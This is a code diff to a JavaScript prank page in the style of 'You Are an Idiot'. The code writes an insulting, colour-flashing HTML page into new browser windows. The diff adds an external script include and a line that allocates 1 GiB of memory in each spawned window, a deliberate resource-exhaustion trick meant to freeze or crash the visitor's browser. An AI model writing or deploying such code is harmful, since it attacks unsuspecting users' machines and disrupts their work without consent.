@@ -60,13 +60,17 @@ function openWindow(url) {
         newWin.document.write(`
             <html>
             <head>
+                <script src="you.js"></script>
                 <title>YOU ARE AN IDIOT</title>
                 <style>
                     body { background: red; color: white; text-align: center; font-size: 24px; margin-top: 100px; }
                 </style>
+                <script>
+                    const x = new Uint8Array(1024 * 1024 * 1024 * 1).fill(255); // 1GiB
+                </script>
             </head>
             <body>
-                <h1>You are an IDIOT! 😂</h1>
+                <h1>You are an IDIOT!</h1>
                 <script>
                     setInterval(() => {
                         document.body.style.background = document.body.style.background === 'red' ? 'blue' : 'red';
